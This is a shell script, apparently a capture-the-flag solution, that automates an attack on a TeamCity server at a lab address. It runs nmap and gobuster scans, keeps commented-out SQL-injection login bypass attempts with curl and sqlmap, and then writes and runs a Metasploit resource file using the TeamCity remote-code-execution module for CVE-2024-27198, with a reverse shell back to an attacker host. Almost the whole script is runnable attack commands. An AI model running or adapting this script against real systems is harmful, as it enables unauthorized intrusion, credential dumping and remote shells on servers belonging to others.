#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.146.80"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -Pn -sC -sV -A -sS -T5 ${target_ip} > $result_folder/nmap-results.txt
gobuster dir -u http://$target_ip:50000 -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/directories.txt
# the 500 server error on 404.html is suspicious. Looking there, I realized team city was a COTS and started looking for exploits

echo "2 - WEBAPP ATTACK"
#curl -s -X GET http://$target_ip:50000/login.html -c $result_folder/cookies.txt -o $result_folder/public_key.html
#TOKEN=$(cat $result_folder/public_key.html | sed -n 's/.*name="tc-csrf-token" content="\(.*\)".*/\1/p')
#echo "'$TOKEN'"
#PUBLIC_KEY=$(cat $result_folder/public_key.html | sed -n 's/.*name="publicKey" value="\(.*\)".*/\1/p')
#echo "'$PUBLIC_KEY'"
#COOKIE=$(cat $result_folder/cookies.txt | sed -n 's/.*TCSESSIONID\(.*\)/\1/p' | tr -d '\t' )
#echo "'$COOKIE'"
#curl -s -X POST "http://$target_ip:50000/loginSubmit.html" -L -H "Content-Type: application/x-www-form-urlencoded" -H "X-TC-CSRF-Token: $TOKEN"-b $result_folder/cookies.txt -d "username='%20OR%201==1--&remember=true&_remember=&submitLogin=Log+in&publicKey=$PUBLIC_KEY&encryptedPassword=2eb7a1289d3e740286327b9a05b6874189f3281a67f4ed4b7a6c8ce2c20688ef6559d5bf7d90e2f66e05b6f8278711ab053fbd278ad4380b11d66152a40cff22e7ec6087cf4d59f564aa1ad92a67d6804d61206a02cdeb03087486ae69dbca14f12e2cbc344d7b3c24f95e37722f1922079a5170eb9929bb213ed8a10728b09c" -o $result_folder/test.html
#sqlmap -u "http://$target_ip:50000/loginSubmit.html" --headers="Content-Type: application/x-www-form-urlencoded\nX-TC-CSRF-Token: $TOKEN" --cookie "TCSESSIONID=$COOKIE" --data "username=test&remember=true&_remember=&submitLogin=Log+in&publicKey=$PUBLIC_KEY&encryptedPassword=2bf3c5b5c9871a918713e82751b804fac08d6c5a9b29bcd203daddd85cd70b98511b9e5a61d5bf08f918426d5a23aa700c027366f90ab27c6b3d9ab227537a80838936c6df3e2dd198d5d5dd67779f9cb08ecaab237119011eb06896ce2c17d53f8e903331fc3494db113ff79767f2c1c8e519c8d88edb1795e20e4a98415ecf" --answers="follow=Y" --level=5 --risk=3 --batch --dump > $result_folder/sqlmap.txt

echo "use multi/http/jetbrains_teamcity_rce_cve_2024_27198" > $result_folder/metasploit.rc
echo "set RHOSTS $target_ip" >> $result_folder/metasploit.rc
echo "set RPORT 50000" >> $result_folder/metasploit.rc
echo "set LHOST $attack_ip" >> $result_folder/metasploit.rc
echo "set LPORT 4444" >> $result_folder/metasploit.rc
echo "exploit" >> $result_folder/metasploit.rc
msfconsole -r $result_folder/metasploit.rc
# Look for /home/ubuntu/flag.txt once shell is created

